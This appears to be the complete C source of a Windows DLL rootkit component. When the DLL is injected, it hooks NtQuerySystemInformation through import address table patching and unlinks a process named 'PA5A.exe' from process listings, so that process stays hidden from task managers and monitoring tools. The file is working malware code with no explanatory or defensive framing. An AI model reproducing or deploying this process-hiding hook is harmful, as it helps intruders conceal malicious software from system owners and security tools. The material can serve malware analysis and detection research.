/*********************************************************************************************/
#include <windows.h>
#include <Psapi.h>
#include <winternl.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi")

/*********************************************************************************************/
// Undocumented headers
/*********************************************************************************************/
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
/*********************************************************************************************/
typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
/*********************************************************************************************/
// prototype of NtQuerySystemInformation
typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );
/*********************************************************************************************/
// Hooked function
NTSTATUS WINAPI MyNtQuerySystemInformation(__in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength)
{
    // Find NtQuerySystemInformation address
    HMODULE hNtdll = GetModuleHandle(L"ntdll");
    PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    
    // Call NtQuerySystemInformation
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    // If the call enumerate the processes
    if (SystemInformationClass == SystemProcessInformation && status == STATUS_SUCCESS)
    {
        // Loop through the list of processes
        PMY_SYSTEM_PROCESS_INFORMATION currentProcess = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION nextProcess = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        do
        {
            currentProcess = nextProcess;
            nextProcess = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)currentProcess + currentProcess->NextEntryOffset);
        
            // Find our process name
            if (!StrNCmp(nextProcess->ImageName.Buffer, L"PA5A.exe", nextProcess->ImageName.Length))
            {
                // Hide process in linked list
                if (!nextProcess->NextEntryOffset)
                    currentProcess->NextEntryOffset = NULL;
                else
                    currentProcess->NextEntryOffset += nextProcess->NextEntryOffset;

                nextProcess = currentProcess;
            }
        } while (currentProcess->NextEntryOffset);
    }
    return status;
}
/*********************************************************************************************/
VOID IatHooking()
{
    MODULEINFO modInfo = { 0 };
    HMODULE hModule = NULL;

    if (!(hModule = GetModuleHandle(NULL)))
        return;

    // Find base address
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO)))
        return;

    // Find Import Directory
    LPBYTE baseOfDll = (LPBYTE)modInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseOfDll;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseOfDll + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = (PIMAGE_OPTIONAL_HEADER) & (ntHeader->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(baseOfDll + optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Find ntdll.dll
    while (importDescriptor->Characteristics)
    {
        if (!StrCmpA("ntdll.dll", (LPCSTR)(baseOfDll + importDescriptor->Name)))
            break;
        importDescriptor++;
    }

    PIMAGE_THUNK_DATA thunkDataNameTable = (PIMAGE_THUNK_DATA)(baseOfDll + importDescriptor->OriginalFirstThunk);
    PIMAGE_THUNK_DATA thunkDataAddressTable = (PIMAGE_THUNK_DATA)(baseOfDll + importDescriptor->FirstThunk);

    while (!(thunkDataNameTable->u1.Ordinal & IMAGE_ORDINAL_FLAG) && thunkDataNameTable->u1.AddressOfData)
    {
        PIMAGE_IMPORT_BY_NAME importByName = { 0 };
        importByName = (PIMAGE_IMPORT_BY_NAME)(baseOfDll + thunkDataNameTable->u1.AddressOfData);
        if (!StrCmpA("NtQuerySystemInformation", (LPCSTR)(importByName->Name)))
            break;

        thunkDataNameTable++;
        thunkDataAddressTable++;
    }

    // Overwrite function pointer
    DWORD oldProctection = 0;
    if (!VirtualProtect((LPVOID) & (thunkDataAddressTable->u1.Function), sizeof(DWORD), PAGE_READWRITE, &oldProctection))
        return;

    thunkDataAddressTable->u1.Function = (ULONGLONG)MyNtQuerySystemInformation;

    if (!VirtualProtect((LPVOID) & (thunkDataAddressTable->u1.Function), sizeof(DWORD), oldProctection, NULL))
        return;

    if (!CloseHandle(hModule))
        return;
}
/*********************************************************************************************/
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        IatHooking();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
/*********************************************************************************************/
